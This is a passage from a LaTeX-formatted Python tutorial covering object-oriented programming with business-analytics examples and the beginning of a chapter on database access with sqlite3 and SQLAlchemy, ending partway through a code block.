Polymorphism allows objects of different classes to be treated as
objects of a common superclass. It is often used when different classes
share a common interface.

\subsubsection{Example: Polymorphism with Method
Overriding}\label{example-polymorphism-with-method-overriding}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Animal:}
    \KeywordTok{def}\NormalTok{ make\_sound(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{pass}

\KeywordTok{class}\NormalTok{ Dog(Animal):}
    \KeywordTok{def}\NormalTok{ make\_sound(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \StringTok{"Bark"}

\KeywordTok{class}\NormalTok{ Cat(Animal):}
    \KeywordTok{def}\NormalTok{ make\_sound(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \StringTok{"Meow"}

\CommentTok{\# Function to demonstrate polymorphism}
\KeywordTok{def}\NormalTok{ animal\_sound(animal):}
    \BuiltInTok{print}\NormalTok{(animal.make\_sound())}

\CommentTok{\# Creating objects of Dog and Cat classes}
\NormalTok{dog }\OperatorTok{=}\NormalTok{ Dog()}
\NormalTok{cat }\OperatorTok{=}\NormalTok{ Cat()}
\NormalTok{animal\_sound(dog)  }\CommentTok{\# Output: Bark}
\NormalTok{animal\_sound(cat)  }\CommentTok{\# Output: Meow}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-13}

Object-Oriented Programming (OOP) is a powerful paradigm that allows you
to structure your Python programs using classes and objects. By
understanding and implementing the concepts of classes, objects,
inheritance, encapsulation, and polymorphism, you can create more
modular, reusable, and maintainable code.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial: Python Object-Oriented Programming (OOP)
Using Business Analytics and Information Systems
Examples}\label{deep-dive-tutorial-python-object-oriented-programming-oop-using-business-analytics-and-information-systems-examples}

Object-Oriented Programming (OOP) is a programming paradigm that uses
objects and classes to structure software in a way that is modular,
reusable, and easy to maintain. This tutorial will provide a
comprehensive guide to Python OOP concepts, using examples relevant to
Business Analytics and Information Systems (BAIS).

\section{Table of Contents}\label{table-of-contents-7}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-oop]{Introduction to OOP}
\item
  \hyperref[defining-classes-and-creating-objects]{Defining Classes and
  Creating Objects}
\item
  \hyperref[attributes-and-methods]{Attributes and Methods}
\item
  \hyperref[encapsulation]{Encapsulation}
\item
  \hyperref[inheritance]{Inheritance}
\item
  \hyperref[polymorphism]{Polymorphism}
\item
  \hyperref[using-oop-in-business-analytics]{Using OOP in Business
  Analytics}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to OOP}\label{introduction-to-oop}

OOP is centered around objects, which are instances of classes. A class
defines a blueprint for objects, encapsulating data (attributes) and
behavior (methods).

\subsection{Key Concepts}\label{key-concepts}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Class}: A blueprint for creating objects. Defines a set of
  attributes and methods.
\item
  \textbf{Object}: An instance of a class.
\item
  \textbf{Attributes}: Data stored inside an object.
\item
  \textbf{Methods}: Functions that operate on the data inside an object.
\end{enumerate}

\section{Defining Classes and Creating
Objects}\label{defining-classes-and-creating-objects}

\subsection{Defining a Class}\label{defining-a-class}

In Python, a class is defined using the \texttt{class} keyword.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \ControlFlowTok{pass}
\end{Highlighting}
\end{Shaded}

\subsection{Creating an Object}\label{creating-an-object}

An object is created by calling the class.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{emp1 }\OperatorTok{=}\NormalTok{ Employee()}
\end{Highlighting}
\end{Shaded}

\section{Attributes and Methods}\label{attributes-and-methods-1}

\subsection{Attributes}\label{attributes}

Attributes are variables that belong to an object.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.}\BuiltInTok{id} \OperatorTok{=} \BuiltInTok{id}
\end{Highlighting}
\end{Shaded}

\subsection{Methods}\label{methods}

Methods are functions defined inside a class.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.}\BuiltInTok{id} \OperatorTok{=} \BuiltInTok{id}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\BuiltInTok{id}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{emp1 }\OperatorTok{=}\NormalTok{ Employee(}\StringTok{"John Doe"}\NormalTok{, }\DecValTok{101}\NormalTok{)}
\NormalTok{emp1.display\_info()}
\end{Highlighting}
\end{Shaded}

\section{Encapsulation}\label{encapsulation-1}

Encapsulation is the bundling of data and methods within a class. It
restricts access to some of the object's components, which can prevent
the accidental modification of data.

\subsection{Example}\label{example-7}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{):}
        \VariableTok{self}\NormalTok{.\_\_name }\OperatorTok{=}\NormalTok{ name  }\CommentTok{\# Private attribute}
        \VariableTok{self}\NormalTok{.\_\_id }\OperatorTok{=} \BuiltInTok{id}      \CommentTok{\# Private attribute}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{\_\_name}\SpecialCharTok{\}}\SpecialStringTok{, ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{\_\_id}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

    \KeywordTok{def}\NormalTok{ set\_name(}\VariableTok{self}\NormalTok{, name):}
        \VariableTok{self}\NormalTok{.\_\_name }\OperatorTok{=}\NormalTok{ name}

    \KeywordTok{def}\NormalTok{ get\_name(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \VariableTok{self}\NormalTok{.\_\_name}

\NormalTok{emp1 }\OperatorTok{=}\NormalTok{ Employee(}\StringTok{"John Doe"}\NormalTok{, }\DecValTok{101}\NormalTok{)}
\NormalTok{emp1.display\_info()}
\NormalTok{emp1.set\_name(}\StringTok{"Jane Doe"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(emp1.get\_name())}
\end{Highlighting}
\end{Shaded}

\section{Inheritance}\label{inheritance-1}

Inheritance allows a class (child class) to inherit attributes and
methods from another class (parent class).

\subsection{Example}\label{example-8}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.}\BuiltInTok{id} \OperatorTok{=} \BuiltInTok{id}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\BuiltInTok{id}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\KeywordTok{class}\NormalTok{ Manager(Employee):}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{, department):}
        \BuiltInTok{super}\NormalTok{().}\FunctionTok{\_\_init\_\_}\NormalTok{(name, }\BuiltInTok{id}\NormalTok{)}
        \VariableTok{self}\NormalTok{.department }\OperatorTok{=}\NormalTok{ department}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{super}\NormalTok{().display\_info()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Department: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{department}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{mgr1 }\OperatorTok{=}\NormalTok{ Manager(}\StringTok{"Alice Smith"}\NormalTok{, }\DecValTok{102}\NormalTok{, }\StringTok{"IT"}\NormalTok{)}
\NormalTok{mgr1.display\_info()}
\end{Highlighting}
\end{Shaded}

\section{Polymorphism}\label{polymorphism-1}

Polymorphism allows methods to be used in different ways, often by
overriding them in derived classes.

\subsection{Example}\label{example-9}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.}\BuiltInTok{id} \OperatorTok{=} \BuiltInTok{id}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\BuiltInTok{id}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\KeywordTok{class}\NormalTok{ Manager(Employee):}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{, department):}
        \BuiltInTok{super}\NormalTok{().}\FunctionTok{\_\_init\_\_}\NormalTok{(name, }\BuiltInTok{id}\NormalTok{)}
        \VariableTok{self}\NormalTok{.department }\OperatorTok{=}\NormalTok{ department}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{super}\NormalTok{().display\_info()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Department: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{department}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\KeywordTok{class}\NormalTok{ Intern(Employee):}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, }\BuiltInTok{id}\NormalTok{, duration):}
        \BuiltInTok{super}\NormalTok{().}\FunctionTok{\_\_init\_\_}\NormalTok{(name, }\BuiltInTok{id}\NormalTok{)}
        \VariableTok{self}\NormalTok{.duration }\OperatorTok{=}\NormalTok{ duration}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{super}\NormalTok{().display\_info()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Internship Duration: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{duration}\SpecialCharTok{\}}\SpecialStringTok{ months"}\NormalTok{)}

\NormalTok{employees }\OperatorTok{=}\NormalTok{ [Manager(}\StringTok{"Alice Smith"}\NormalTok{, }\DecValTok{102}\NormalTok{, }\StringTok{"IT"}\NormalTok{), Intern(}\StringTok{"Bob Brown"}\NormalTok{, }\DecValTok{103}\NormalTok{, }\DecValTok{6}\NormalTok{)]}

\ControlFlowTok{for}\NormalTok{ employee }\KeywordTok{in}\NormalTok{ employees:}
\NormalTok{    employee.display\_info()}
\end{Highlighting}
\end{Shaded}

\section{Using OOP in Business
Analytics}\label{using-oop-in-business-analytics}

OOP can be used to model and manage complex data structures and
processes in business analytics.

\subsection{Example: Data Analysis
Classes}\label{example-data-analysis-classes}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ DataSource:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, data):}
        \VariableTok{self}\NormalTok{.data }\OperatorTok{=}\NormalTok{ data}

    \KeywordTok{def}\NormalTok{ display\_data(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\VariableTok{self}\NormalTok{.data)}

\KeywordTok{class}\NormalTok{ DataAnalyzer:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, data\_source):}
        \VariableTok{self}\NormalTok{.data\_source }\OperatorTok{=}\NormalTok{ data\_source}

    \KeywordTok{def}\NormalTok{ analyze(}\VariableTok{self}\NormalTok{):}
        \CommentTok{\# Placeholder for analysis logic}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Analyzing data..."}\NormalTok{)}

\KeywordTok{class}\NormalTok{ ReportGenerator:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, data\_analyzer):}
        \VariableTok{self}\NormalTok{.data\_analyzer }\OperatorTok{=}\NormalTok{ data\_analyzer}

    \KeywordTok{def}\NormalTok{ generate\_report(}\VariableTok{self}\NormalTok{):}
        \CommentTok{\# Placeholder for report generation logic}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Generating report..."}\NormalTok{)}

\NormalTok{data }\OperatorTok{=}\NormalTok{ [}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{, }\DecValTok{4}\NormalTok{, }\DecValTok{5}\NormalTok{]}
\NormalTok{data\_source }\OperatorTok{=}\NormalTok{ DataSource(data)}
\NormalTok{analyzer }\OperatorTok{=}\NormalTok{ DataAnalyzer(data\_source)}
\NormalTok{report\_gen }\OperatorTok{=}\NormalTok{ ReportGenerator(analyzer)}

\NormalTok{data\_source.display\_data()}
\NormalTok{analyzer.analyze()}
\NormalTok{report\_gen.generate\_report()}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-2}

\subsection{Example 1: Customer Relationship Management
(CRM)}\label{example-1-customer-relationship-management-crm}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Customer:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, customer\_id, name, email):}
        \VariableTok{self}\NormalTok{.customer\_id }\OperatorTok{=}\NormalTok{ customer\_id}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.email }\OperatorTok{=}\NormalTok{ email}

    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Customer ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{customer\_id}\SpecialCharTok{\}}\SpecialStringTok{, Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, Email: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{email}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\KeywordTok{class}\NormalTok{ Order:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, order\_id, customer, total):}
        \VariableTok{self}\NormalTok{.order\_id }\OperatorTok{=}\NormalTok{ order\_id}
        \VariableTok{self}\NormalTok{.customer }\OperatorTok{=}\NormalTok{ customer}
        \VariableTok{self}\NormalTok{.total }\OperatorTok{=}\NormalTok{ total}

    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Order ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{order\_id}\SpecialCharTok{\}}\SpecialStringTok{, Customer: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{customer}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, Total: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{total}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{cust1 }\OperatorTok{=}\NormalTok{ Customer(}\DecValTok{1}\NormalTok{, }\StringTok{"John Doe"}\NormalTok{, }\StringTok{"john@example.com"}\NormalTok{)}
\NormalTok{order1 }\OperatorTok{=}\NormalTok{ Order(}\DecValTok{101}\NormalTok{, cust1, }\FloatTok{250.75}\NormalTok{)}

\NormalTok{cust1.display\_info()}
\NormalTok{order1.display\_info()}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: Inventory Management
System}\label{example-2-inventory-management-system}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Product:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, product\_id, name, price):}
        \VariableTok{self}\NormalTok{.product\_id }\OperatorTok{=}\NormalTok{ product\_id}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.price }\OperatorTok{=}\NormalTok{ price}

    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Product ID: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{product\_id}\SpecialCharTok{\}}\SpecialStringTok{, Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, Price: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{price}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\KeywordTok{class}\NormalTok{ Inventory:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.products }\OperatorTok{=}\NormalTok{ []}

    \KeywordTok{def}\NormalTok{ add\_product(}\VariableTok{self}\NormalTok{, product):}
        \VariableTok{self}\NormalTok{.products.append(product)}

    \KeywordTok{def}\NormalTok{ display\_inventory(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{for}\NormalTok{ product }\KeywordTok{in} \VariableTok{self}\NormalTok{.products:}
\NormalTok{            product.display\_info()}

\NormalTok{inv }\OperatorTok{=}\NormalTok{ Inventory()}
\NormalTok{prod1 }\OperatorTok{=}\NormalTok{ Product(}\DecValTok{201}\NormalTok{, }\StringTok{"Laptop"}\NormalTok{, }\FloatTok{1200.50}\NormalTok{)}
\NormalTok{prod2 }\OperatorTok{=}\NormalTok{ Product(}\DecValTok{202}\NormalTok{, }\StringTok{"Mouse"}\NormalTok{, }\FloatTok{25.75}\NormalTok{)}

\NormalTok{inv.add\_product(prod1)}
\NormalTok{inv.add\_product(prod2)}
\NormalTok{inv.display\_inventory()}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-14}

Object-Oriented Programming in Python provides a robust framework for
modeling complex systems in business analytics and information systems.
By understanding and applying concepts such as classes, objects,
encapsulation, inheritance, and polymorphism, you can create modular,
reusable, and maintainable code. This tutorial covered the basics and
provided practical examples to help you get started with OOP in Python
for BAIS applications. Happy coding!

\bookmarksetup{startatroot}

\chapter{Introduction to Database Interaction with
Python}\label{introduction-to-database-interaction-with-python}

Interacting with databases is a crucial aspect of many applications.
Python provides robust libraries for connecting to databases, performing
CRUD (Create, Read, Update, Delete) operations, and managing database
connections. This tutorial will cover connecting to and interacting with
databases using Python, focusing on \texttt{sqlite3} for SQLite
databases and \texttt{SQLAlchemy} for Object Relational Mapping (ORM).

\subsection{\texorpdfstring{Interacting with SQLite Databases using
\texttt{sqlite3}}{Interacting with SQLite Databases using sqlite3}}\label{interacting-with-sqlite-databases-using-sqlite3}

SQLite is a C library that provides a lightweight, disk-based database.
It doesn't require a separate server process, making it an excellent
choice for embedded systems and small applications.

\subsubsection{Connecting to a Database}\label{connecting-to-a-database}

You can connect to an SQLite database using the \texttt{sqlite3} module.
If the database does not exist, it will be created.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sqlite3}

\CommentTok{\# Connect to SQLite database}
\NormalTok{connection }\OperatorTok{=}\NormalTok{ sqlite3.}\ExtensionTok{connect}\NormalTok{(}\StringTok{\textquotesingle{}example.db\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Create a cursor object}
\NormalTok{cursor }\OperatorTok{=}\NormalTok{ connection.cursor()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Creating a Table}\label{creating-a-table}

You can create a table using the \texttt{CREATE\ TABLE} SQL statement.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Create a table}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}
\StringTok{CREATE TABLE IF NOT EXISTS employees (}
\StringTok{    id INTEGER PRIMARY KEY,}
\StringTok{    name TEXT NOT NULL,}
\StringTok{    age INTEGER,}
\StringTok{    department TEXT}
\StringTok{)}
\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Commit the changes}
\NormalTok{connection.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Inserting Data}\label{inserting-data}

You can insert data into the table using the \texttt{INSERT\ INTO} SQL
statement.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Insert data into the table}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}
\StringTok{INSERT INTO employees (name, age, department)}
\StringTok{VALUES (\textquotesingle{}John Doe\textquotesingle{}, 30, \textquotesingle{}Finance\textquotesingle{})}
\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Commit the changes}
\NormalTok{connection.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Reading Data}\label{reading-data}

You can read data from the table using the \texttt{SELECT} SQL
statement.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Read data from the table}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}SELECT * FROM employees\textquotesingle{}}\NormalTok{)}
\NormalTok{rows }\OperatorTok{=}\NormalTok{ cursor.fetchall()}

\ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ rows:}
    \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Updating Data}\label{updating-data}

You can update data in the table using the \texttt{UPDATE} SQL
statement.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Update data in the table}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}
\StringTok{UPDATE employees}
\StringTok{SET age = 31}
\StringTok{WHERE name = \textquotesingle{}John Doe\textquotesingle{}}
\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Commit the changes}
\NormalTok{connection.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Deleting Data}\label{deleting-data}

You can delete data from the table using the \texttt{DELETE} SQL
statement.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Delete data from the table}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}
\StringTok{DELETE FROM employees}
\StringTok{WHERE name = \textquotesingle{}John Doe\textquotesingle{}}
\StringTok{\textquotesingle{}\textquotesingle{}\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Commit the changes}
\NormalTok{connection.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Closing the Connection}\label{closing-the-connection}

Always close the connection when you're done interacting with the
database.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Close the connection}
\NormalTok{connection.close()}
\end{Highlighting}
\end{Shaded}

\subsection{Interacting with Databases using
SQLAlchemy}\label{interacting-with-databases-using-sqlalchemy}

SQLAlchemy is a powerful ORM library that provides a high-level
interface for interacting with databases in Python.

\subsubsection{Installing SQLAlchemy}\label{installing-sqlalchemy}

First, install SQLAlchemy using pip:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install sqlalchemy}
\end{Highlighting}
\end{Shaded}

\subsubsection{Connecting to a
Database}\label{connecting-to-a-database-1}

You can connect to a database using SQLAlchemy's \texttt{create\_engine}
function.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine}

\CommentTok{\# Create an engine}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{\textquotesingle{}sqlite:///example.db\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Defining a Model}\label{defining-a-model}

You define models using Python classes and SQLAlchemy's ORM features.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.ext.declarative }\ImportTok{import}\NormalTok{ declarative\_base}
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ Column, Integer, String}

\NormalTok{Base }\OperatorTok{=}\NormalTok{ declarative\_base()}

\KeywordTok{class}\NormalTok{ Employee(Base):}
\NormalTok{    \_\_tablename\_\_ }\OperatorTok{=} \StringTok{\textquotesingle{}employees\textquotesingle{}}

    \BuiltInTok{id} \OperatorTok{=}\NormalTok{ Column(Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    name }\OperatorTok{=}\NormalTok{ Column(String, nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\NormalTok{    age }\OperatorTok{=}\NormalTok{ Column(Integer)}
\NormalTok{    department }\OperatorTok{=}\NormalTok{ Column(String)}

    \KeywordTok{def} \FunctionTok{\_\_repr\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \SpecialStringTok{f"\textless{}Employee(name=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, age=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{age}\SpecialCharTok{\}}\SpecialStringTok{, department=}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{department}\SpecialCharTok{\}}\SpecialStringTok{)\textgreater{}"}
\end{Highlighting}
\end{Shaded}

\subsubsection{Creating a Table}\label{creating-a-table-1}

You can create tables in the database using the \texttt{create\_all}
method.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Create tables}
\NormalTok{Base.metadata.create\_all(engine)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Creating a Session}\label{creating-a-session}

You need a session to interact with the database.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy.orm }\ImportTok{import}\NormalTok{ sessionmaker}

\CommentTok{\# Create a session}
\NormalTok{Session }\OperatorTok{=}\NormalTok{ sessionmaker(bind}\OperatorTok{=}\NormalTok{engine)}
\NormalTok{session }\OperatorTok{=}\NormalTok{ Session()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Inserting Data}\label{inserting-data-1}

You can insert data into the database by creating instances of the model
and adding them to the session.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Insert data}
\NormalTok{new\_employee }\OperatorTok{=}\NormalTok{ Employee(name}\OperatorTok{=}\StringTok{\textquotesingle{}Jane Doe\textquotesingle{}}\NormalTok{, age}\OperatorTok{=}\DecValTok{28}\NormalTok{, department}\OperatorTok{=}\StringTok{\textquotesingle{}Marketing\textquotesingle{}}\NormalTok{)}
\NormalTok{session.add(new\_employee)}
\NormalTok{session.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Reading Data}\label{reading-data-1}

You can read data from the database using the session's \texttt{query}
method.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Read data}
\NormalTok{employees }\OperatorTok{=}\NormalTok{ session.query(Employee).}\BuiltInTok{all}\NormalTok{()}
\ControlFlowTok{for}\NormalTok{ employee }\KeywordTok{in}\NormalTok{ employees:}
    \BuiltInTok{print}\NormalTok{(employee)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Updating Data}\label{updating-data-1}

You can update data in the database by modifying the attributes of the
model instance and committing the session.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Update data}
